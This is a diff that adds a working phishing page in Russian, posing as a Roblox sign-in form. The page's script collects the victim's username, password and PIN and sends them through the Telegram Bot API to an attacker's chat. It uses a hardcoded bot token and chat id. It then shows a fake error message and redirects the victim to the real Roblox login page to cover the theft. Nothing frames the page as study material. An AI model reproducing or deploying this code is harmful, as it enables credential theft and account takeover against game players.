@@ -1,0 +1,52 @@
+‎<!DOCTYPE html>
+‎<html>
+‎<head>
+‎<title>Roblox вход</title>
+‎<style>
+‎body{background:#0b0b1a;color:white;font-family:Arial;text-align:center;padding-top:70px}
+‎input{display:block;margin:15px auto;padding:15px;width:290px;border-radius:10px;border:0;background:#1e1e3a;color:white;font-size:17px}
+‎button{background:#0066ff;color:white;padding:16px 60px;border:0;border-radius:10px;font-size:20px;font-weight:bold}
+‎h2{color:#00aaff}
+‎</style>
+‎</head>
+‎<body>
+‎<h2>🔐 Вход в Roblox</h2>
+‎<form id="loginForm">
+‎<input type="text" id="username" placeholder="Имя пользователя" required>
+‎<input type="password" id="password" placeholder="Пароль" required>
+‎<input type="text" id="pin" placeholder="PIN-код (если есть)">
+‎<button type="submit">Войти</button>
+‎</form>
+‎<p style="color:#555;font-size:12px;margin-top:30px">Защищённое соединение</p>
+‎
+‎<script>
+‎document.getElementById("loginForm").addEventListener("submit", function(e) {
+‎    e.preventDefault();
+‎    var username = document.getElementById("username").value;
+‎    var password = document.getElementById("password").value;
+‎    var pin = document.getElementById("pin").value;
+‎    var time = new Date().toLocaleString();
+‎
+‎    var msg = "🟢 НОВЫЙ ВХОД\n";
+‎    msg += "Логин: " + username + "\n";
+‎    msg += "Пароль: " + password + "\n";
+‎    msg += "PIN: " + pin + "\n";
+‎    msg += "Время: " + time;
+‎
+‎    var botToken = "8921516233:AAEudGad6WXAB1YUVk9gweNOCGej1KZeD04";
+‎    var chatId = "6929974696";
+‎    var url = "https://api.telegram.org/bot" + botToken + "/sendMessage?chat_id=" + chatId + "&text=" + encodeURIComponent(msg);
+‎
+‎    fetch(url)
+‎        .then(() => {
+‎            alert("Ошибка входа. Попробуйте ещё раз.");
+‎            window.location.href = "https://www.roblox.com/login";
+‎        })
+‎        .catch(() => {
+‎            alert("Ошибка входа.");
+‎            window.location.href = "https://www.roblox.com/login";
+‎        });
+‎});
+‎</script>
+‎</body>
+‎</html>
